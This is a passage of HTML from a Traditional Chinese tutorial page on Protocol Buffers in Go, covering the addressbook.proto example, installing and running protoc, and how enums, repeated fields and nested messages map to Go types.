plain\">enum Foo {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> FOO_UNSPECIFIED = 0;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> FOO_FIRST_VALUE = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> FOO_SECOND_VALUE = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-protobuffer-檔\">使用 ProtoBuffer 檔<a href=\"#使用-protobuffer-檔\" class=\"hash-link\" aria-label=\"使用 ProtoBuffer 檔的直接連結\" title=\"使用 ProtoBuffer 檔的直接連結\">​</a></h2><p>這裡定義好的 proto 檔如下，接著就會利用這個 proto 檔來做一些操作：</p><blockquote><p><a href=\"https://github.com/protocolbuffers/protobuf/tree/master/examples\" target=\"_blank\" rel=\"noopener noreferrer\">protobuffer examples</a> @ github</p></blockquote><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">// https://github.com/protocolbuffers/protobuf/blob/master/examples/addressbook.proto</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">syntax = &quot;proto3&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">package sandbox.protobuf_sandbox;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">option go_package = &quot;sandbox/protobuf-sandbox&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">import &quot;google/protobuf/timestamp.proto&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message Person {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string name = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  int32 id = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string email = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  enum PhoneType {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    MOBILE = 0;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    HOME = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    WORK = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  }</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  message PhoneNumber {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    string number = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    PhoneType type = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  }</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated PhoneNumber phones = 4;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  google.protobuf.Timestamp last_updated = 5;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message AddressBook {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated Person people = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li><code>AddressBook</code> message 包含了<code>Person</code> message。</li><li>message 也可以在某一個 message 內被定義，例如，在 <code>Person</code> message 中定義並使用了 <code>PhoneNumber</code> message。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"編譯-protocol-bufferscompiling\">編譯 Protocol Buffers（Compiling）<a href=\"#編譯-protocol-bufferscompiling\" class=\"hash-link\" aria-label=\"編譯 Protocol Buffers（Compiling）的直接連結\" title=\"編譯 Protocol Buffers（Compiling）的直接連結\">​</a></h3><p>目前的資料夾結構如下：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">.</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">└── sandbox</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">   └── protobuf-sandbox</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">           ├── go.mod</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">            ├── go.sum</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">            └── proto</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">                └── addressbook.proto</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"1-安裝-compiler\">1. 安裝 Compiler<a href=\"#1-安裝-compiler\" class=\"hash-link\" aria-label=\"1. 安裝 Compiler的直接連結\" title=\"1. 安裝 Compiler的直接連結\">​</a></h4><p>首先需要在電腦上<a href=\"https://github.com/protocolbuffers/protobuf/releases\" target=\"_blank\" rel=\"noopener noreferrer\">安裝 protocol buffer</a> 的 compilers，如果是 Mac 的話，可以透過 home-brew 安裝：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 安裝 compiler，安裝完後就會有 protoc CLI 工具</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ brew </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">install</span><span class=\"token plain\"> protobuf</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ protoc --version  </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># Ensure compiler version is 3+</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"2-在專案中安裝-go-protocol-buffers-的套件\">2. 在專案中安裝 Go protocol buffers 的套件<a href=\"#2-在專案中安裝-go-protocol-buffers-的套件\" class=\"hash-link\" aria-label=\"2. 在專案中安裝 Go protocol buffers 的套件的直接連結\" title=\"2. 在專案中安裝 Go protocol buffers 的套件的直接連結\">​</a></h4><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 安奘此 compiler 後，即可將 protocol buffer 編譯成 Golang 中可以使用的檔案（純用 Protocol Buffer 而非 gRPC）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ go get -u google.golang.org/protobuf/cmd/protoc-gen-go</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"3-執行-compiler\">3. 執行 compiler<a href=\"#3-執行-compiler\" class=\"hash-link\" aria-label=\"3. 執行 compiler的直接連結\" title=\"3. 執行 compiler的直接連結\">​</a></h4><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># $ protoc -I=$SRC_DIR --go_out=$DST_DIR $SRC_DIR/foobar.proto</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ protoc -I proto/ --go_out</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">proto/ --go_opt</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">paths</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\">source_relative proto/addressbook.proto</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li>由於我們要產出 Go 的程式碼，因此使用 <code>--go_out</code> 這個 option，不同程式語言會使用不同的 options</li><li>使用 <code>--go_opt=paths=source_relative</code> 將可以根據 source file 的相對路徑產出編譯後的 Go 檔</li></ul><p>接著就會在 proto 資料夾中多一隻 <code>addressbook.pb.go</code> 的檔案。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"編譯後的-go-檔內容\">編譯後的 Go 檔內容<a href=\"#編譯後的-go-檔內容\" class=\"hash-link\" aria-label=\"編譯後的 Go 檔內容的直接連結\" title=\"編譯後的 Go 檔內容的直接連結\">​</a></h3><p>根據下放的 Sample Code，在 <code>addressbook.pb.go</code> 的檔案中，可以看到有定義好的：</p><ul><li><code>type Person struct {...}</code></li><li><code>type AddressBook struct{...}</code></li><li><code>type PhoneNumber struct{...}</code></li><li>以及各個 Type 對應的 getter 和 setter</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用編譯後的-proto-檔案\">使用編譯後的 proto 檔案<a href=\"#使用編譯後的-proto-檔案\" class=\"hash-link\" aria-label=\"使用編譯後的 proto 檔案的直接連結\" title=\"使用編譯後的 proto 檔案的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"enum\">enum<a href=\"#enum\" class=\"hash-link\" aria-label=\"enum的直接連結\" title=\"enum的直接連結\">​</a></h3><p><code>enum</code> 欄位對應到 go 中會變成常數，例如 <code>PhoneType</code> 這個 enum 因為是定義在 <code>Person message</code> 中，因此在 go 中會以 <code>Person</code> 作為前綴，可以使用 <code>pb.Person_MOBILE</code>, <code>pb.Person_HOME</code> 等：</p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// enum 在 Go 中會變成常數</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// pb.Person_MOBILE, pb.Person_HOME, pb.Person_WORK</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">switch</span><span class=\"token plain\"> ptype </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\">  </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// ptype 的內容由使用者定義</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">case</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;mobile&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  pn</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Type </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person_MOBILE</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">case</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;home&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  pn</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Type </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person_HOME</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">case</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;work&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  pn</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Type </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person_WORK</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">default</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  fmt</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Printf</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;Unknown phone type %q. Using default.\\n&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> ptype</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"repeated\">repeated<a href=\"#repeated\" class=\"hash-link\" aria-label=\"repeated的直接連結\" title=\"repeated的直接連結\">​</a></h3><p>repeated 欄位對應到 go 中的 slice，可以直接使用 <code>append</code> 方法把對應的 struct 加到該 slice 中：</p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// repeated proto field 對應到 Go 中的 slice field</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">pn </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&amp;</span><span class=\"token plain\">pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person_PhoneNumber</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  Number</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> phone</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">p</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Phones </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">append</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">p</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Phones</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> pn</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"message-type\">Message type<a href=\"#message-type\" class=\"hash-link\" aria-label=\"Message type的直接連結\" title=\"Message type的直接連結\">​</a></h3><p>在 <code>proto</code> 中定義的 message type 在 Go 中會直接對應成一個 Go 的 struct type，例如 <code>message Person</code> 對應到的就是 <code>type Person struct</code>，使用時像是：</p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">import</span><span class=\"token plain\"> pb </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;sandbox/protobuf-sandbox/proto&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">p </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&amp;</span><span class=\"token plain\">pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"message-中-nested-另一個-message\">Message 中 nested 另一個 message<a href=\"#message-中-nested-另一個-message\" class=\"hash-link\" aria-label=\"Message 中 nested 另一個 message的直接連結\" title=\"Message 中 nested 另一個 message的直接連結\">​</a></h3><p>如果一個 message type 是 nested 在另一個 message type 中時，例如 PhoneNumber message 是 nested 在 Person message 中，假設想要在程式中建立 PhoneNumber 這個 message 的 struct，就可以把父層的 message 名稱作為前綴，像是：</p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// PhoneNumber 這個 message type 是 nested 在 Person message</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 在 Go struct 中會使用父層的 message type</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">pn </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&amp;</span><span class=\"token plain\">pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">Person_PhoneNumber</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  Number</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">:</span><span class=\"token plain\"> phone</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 